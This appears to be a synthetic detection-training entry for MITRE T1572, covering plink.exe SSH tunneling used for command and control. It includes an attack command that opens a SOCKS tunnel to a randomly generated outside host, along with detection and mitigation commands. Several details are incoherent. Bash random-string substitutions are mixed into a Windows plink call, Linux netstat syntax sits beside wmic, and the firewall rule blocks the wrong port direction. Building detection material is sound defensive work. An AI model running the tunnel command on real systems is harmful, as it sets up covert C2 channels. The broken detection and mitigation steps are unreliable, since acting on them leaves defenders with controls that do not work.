---
type: campaign
scenario_id: 176
tactic: Command and Control
technique: "T1572: Protocol Tunneling"
technique_id: T1572
tags: [campaign, lotl, command_and_control]
---

# Using plink.exe to establish SSH tunnel for C2.

## Threat Description
Using plink.exe to establish SSH tunnel for C2.

## Attack Command
```
plink -ssh -D 9050 -N $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)@$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com -pw $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)
```

## Detection Logic
Monitor plink: `wmic process where name='plink.exe' get commandline | findstr ssh`; Monitor tunnels: `netstat -anp | grep 9050`.

## Mitigation
Restrict plink: `icacls %programfiles%\PuTTY\plink.exe /deny Everyone:RX`; Block SSH tunnels: `netsh advfirewall firewall add rule name='Block SSH Tunnel' dir=out action=block protocol=TCP localport=9050`.

## AI Training Prompt
Train AI to detect plink SSH tunneling and suggest firewall rules.

## References
- MITRE ATT&CK T1572: https://attack.mitre.org/techniques/T1572/
- CWE-319: https://cwe.mitre.org/data/definitions/319.html
